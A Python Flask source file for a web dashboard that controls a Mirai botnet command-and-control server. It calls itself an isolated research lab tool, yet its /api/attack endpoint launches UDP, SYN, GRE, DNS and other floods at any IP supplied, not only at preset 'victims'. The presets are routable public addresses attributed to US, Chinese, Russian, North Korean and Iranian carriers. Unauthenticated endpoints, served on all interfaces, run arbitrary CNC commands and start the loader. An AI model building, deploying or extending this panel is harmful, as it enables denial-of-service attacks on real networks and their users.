#!/usr/bin/env python3
"""
Mirai Lab Dashboard v2 -- Flask API + World Map UI
Isolated research lab only. Does not ship Mirai attack logic; talks to local CNC.
v2 additions: /api/geo endpoint, /api/attack extended for all 5 lab victims.
"""

from __future__ import annotations

import os
import sys
import threading
import time
from pathlib import Path

from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

from cnc_client import default_client
import lab_control

ROOT     = Path(__file__).resolve().parent
FRONTEND = ROOT.parent / "frontend"

app = Flask(__name__, static_folder=str(FRONTEND), static_url_path="")
CORS(app)
cnc = default_client()

# ---------------------------------------------------------------------------
# Background status poller — updates cache every 8s so /api/status is instant
# ---------------------------------------------------------------------------
_status_cache: dict = {
    "ok": False, "cnc_up": False, "bot_total": 0,
    "distribution": {}, "tcp_peers": 0, "peer_ips": [],
    "error": "starting up...", "logs": [],
}

def _poller():
    while True:
        try:
            data = cnc.refresh_status()
            _status_cache.update(data)
        except Exception as e:
            _status_cache["error"] = str(e)
        time.sleep(8)

_poll_thread = threading.Thread(target=_poller, daemon=True, name="status-poller")
_poll_thread.start()


# ---------------------------------------------------------------------------
# Static
# ---------------------------------------------------------------------------

@app.get("/")
def index():
    return send_from_directory(FRONTEND, "index.html")

@app.get("/<path:path>")
def static_proxy(path: str):
    return send_from_directory(FRONTEND, path)

# ---------------------------------------------------------------------------
# Health
# ---------------------------------------------------------------------------

@app.get("/api/health")
def health():
    return jsonify({"ok": True, "service": "mirai-lab-dashboard-v2"})

# ---------------------------------------------------------------------------
# CNC
# ---------------------------------------------------------------------------

@app.get("/api/status")
def status():
    # Return instantly from cache — background thread keeps it fresh every 8s
    return jsonify(_status_cache)

@app.get("/api/logs")
def logs():
    return jsonify({"logs": cnc.log.snapshot()})

@app.post("/api/command")
def command():
    data = request.get_json(silent=True) or {}
    cmd  = (data.get("command") or "").strip()
    if not cmd:
        return jsonify({"ok": False, "error": "command required"}), 400
    return jsonify(cnc.run_command(cmd))

@app.post("/api/botcount")
def botcount():
    return jsonify(cnc.run_command("botcount"))

# ---------------------------------------------------------------------------
# Attack -- v2: supports all 5 lab victims by key OR direct IP
# ---------------------------------------------------------------------------

# Hardcoded lab victim IPs (match LAB_NODES in app.js)
LAB_VICTIMS = {
    "us": os.environ.get("LAB_TARGET_US",  "12.1.2.100"),
    "cn": os.environ.get("LAB_TARGET_CN",  "202.97.0.100"),
    "ru": os.environ.get("LAB_TARGET_RU",  "217.107.0.100"),
    "kp": os.environ.get("LAB_TARGET_KP",  "175.45.176.100"),
    "ir": os.environ.get("LAB_TARGET_IR",  "5.200.0.100"),
    # v1 compatibility
    "sg": os.environ.get("LAB_TARGET_SG",  "203.0.113.100"),
    "kr": os.environ.get("LAB_TARGET_KR",  "210.89.0.100"),
}

ALLOWED_METHODS = {"udp","syn","ack","stomp","dns","vse","greip","greeth","udpplain"}

@app.post("/api/attack")
def attack():
    data     = request.get_json(silent=True) or {}
    target   = (data.get("target") or "").lower()
    direct_ip= (data.get("ip")     or "").strip()
    duration = max(1, min(int(data.get("duration") or 30), 300))
    method   = (data.get("method") or "udp").lower()
    dport    = int(data.get("dport") or 80)

    if method not in ALLOWED_METHODS:
        method = "udp"

    ip = direct_ip or LAB_VICTIMS.get(target, "")
    if not ip:
        return jsonify({"ok": False, "error": "unknown target"}), 400

    cmd    = f"{method} {ip} {duration} dport={dport}"
    result = cnc.run_command(cmd)
    result["command"]   = cmd
    result["target_ip"] = ip
    return jsonify(result)

# ---------------------------------------------------------------------------
# Geo endpoint -- returns node list for frontend map (hardcoded)
# ---------------------------------------------------------------------------

GEO_NODES = [
    {"id":"c2",   "type":"attacker","label":"C2 / CNC",   "ip":"185.10.20.100","lat":48.80,"lon":2.35, "country":"Lab (C2)"},
    {"id":"ldr",  "type":"attacker","label":"Loader",     "ip":"185.10.20.200","lat":48.85,"lon":2.50, "country":"Lab (Loader)"},
    {"id":"bot1", "type":"bot","label":"Bot-1 (TH)","ip":"110.164.20.11", "lat":13.75,"lon":100.52,"country":"Thailand"},
    {"id":"bot2", "type":"bot","label":"Bot-2 (TH)","ip":"125.20.30.11",  "lat":14.00,"lon":100.80,"country":"Thailand"},
    {"id":"bot3", "type":"bot","label":"Bot-3 (US)","ip":"66.249.64.100", "lat":37.77,"lon":-122.4,"country":"USA"},
    {"id":"bot4", "type":"bot","label":"Bot-4 (KR)","ip":"210.89.0.100",  "lat":37.57,"lon":126.97,"country":"South Korea"},
    {"id":"bot5", "type":"bot","label":"Bot-5 (CN)","ip":"114.240.0.100", "lat":39.93,"lon":116.38,"country":"China"},
    {"id":"bot6", "type":"bot","label":"Bot-6 (RU)","ip":"95.24.0.100",   "lat":55.75,"lon":37.62, "country":"Russia"},
    {"id":"bot7", "type":"bot","label":"Bot-7 (DE)","ip":"46.112.0.100",  "lat":52.52,"lon":13.40, "country":"Germany"},
    {"id":"bot8", "type":"bot","label":"Bot-8 (BR)","ip":"177.0.0.100",   "lat":-23.55,"lon":-46.63,"country":"Brazil"},
    {"id":"bot9", "type":"bot","label":"Bot-9 (UK)","ip":"8.2.0.100",     "lat":51.51,"lon":-0.12, "country":"United Kingdom"},
    {"id":"bot10","type":"bot","label":"Bot-10 (JP)","ip":"1.0.1.100",    "lat":35.68,"lon":139.69,"country":"Japan"},
    {"id":"v_us","type":"victim","label":"Victim: USA",    "ip":"12.1.2.100",    "lat":40.71,"lon":-74.01,"country":"USA (AT&T)",        "victimKey":"us"},
    {"id":"v_cn","type":"victim","label":"Victim: China",  "ip":"202.97.0.100",  "lat":31.23,"lon":121.47,"country":"China (Telecom)",   "victimKey":"cn"},
    {"id":"v_ru","type":"victim","label":"Victim: Russia", "ip":"217.107.0.100", "lat":59.93,"lon":30.32, "country":"Russia (RT)",       "victimKey":"ru"},
    {"id":"v_kp","type":"victim","label":"Victim: N.Korea","ip":"175.45.176.100","lat":39.03,"lon":125.75,"country":"N.Korea (Star JV)","victimKey":"kp"},
    {"id":"v_ir","type":"victim","label":"Victim: Iran",   "ip":"5.200.0.100",   "lat":35.69,"lon":51.42, "country":"Iran (TCI)",        "victimKey":"ir"},
]

@app.get("/api/geo")
def geo():
    return jsonify({"nodes": GEO_NODES})

# ---------------------------------------------------------------------------
# Lab control (C2 local + Loader agent proxy)
# ---------------------------------------------------------------------------

@app.get("/api/lab/overview")
def lab_overview():
    return jsonify(lab_control.lab_overview())

@app.post("/api/lab/cnc/start")
def lab_cnc_start():
    return jsonify(lab_control.start_cnc())

@app.post("/api/lab/cnc/stop")
def lab_cnc_stop():
    return jsonify(lab_control.stop_cnc())

@app.post("/api/lab/http/start")
def lab_http_start():
    return jsonify(lab_control.loader_request("POST", "/http/start", {}))

@app.post("/api/lab/http/stop")
def lab_http_stop():
    return jsonify(lab_control.loader_request("POST", "/http/stop", {}))

@app.post("/api/lab/loader/run")
def lab_loader_run():
    data = request.get_json(silent=True) or {}
    return jsonify(lab_control.loader_request("POST", "/loader/run", data, timeout=20.0))

@app.get("/api/lab/loader/log")
def lab_loader_log():
    return jsonify(lab_control.loader_request("GET", "/loader/log", timeout=10.0))

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    host = os.environ.get("DASH_HOST", "0.0.0.0")
    port = int(os.environ.get("DASH_PORT", "8080"))
    print(f"[dashboard-v2] frontend={FRONTEND}", file=sys.stderr)
    print(f"[dashboard-v2] http://{host}:{port}", file=sys.stderr)
    print(f"[dashboard-v2] CNC={os.environ.get('CNC_HOST','127.0.0.1')}:{os.environ.get('CNC_PORT','23')}", file=sys.stderr)
    print(f"[dashboard-v2] Loader agent={os.environ.get('LOADER_AGENT_URL','http://185.10.20.200:9090')}", file=sys.stderr)
    app.run(host=host, port=port, debug=False, threaded=True)


if __name__ == "__main__":
    main()
